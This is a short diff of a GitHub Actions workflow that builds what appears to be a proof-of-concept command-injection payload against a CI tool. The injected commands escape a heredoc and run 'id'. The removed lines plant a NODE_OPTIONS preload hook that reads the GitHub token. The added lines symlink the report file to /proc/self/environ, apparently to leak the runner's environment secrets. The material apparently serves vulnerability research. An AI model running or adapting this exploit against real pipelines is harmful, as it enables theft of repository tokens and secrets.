@@ -28,10 +28,8 @@ jobs:
               "EOF\n"
               "id\n"
               "echo INJECTED_COMMAND_RAN_$RANDOM\n"
-              "echo \"NODE_OPTIONS=--require $GITHUB_WORKSPACE/poc-hook.js\" >> $GITHUB_ENV\n"
-              "printf '%s\\n' \"const fs=require('fs');\" \"const t=process.env.INPUT_GITHUB_TOKEN||'';\" "
-              "\"fs.writeFileSync(process.env.GITHUB_WORKSPACE+'/hook-proof.txt','INPUT_GITHUB_TOKEN_LEN='+t.length+' TOKEN_PREFIX='+t.slice(0,6));\" "
-              "> $GITHUB_WORKSPACE/poc-hook.js\n"
+              "rm -f openssf-report.html\n"
+              "ln -s /proc/self/environ openssf-report.html\n"
               "exit 0\n"
           )
 
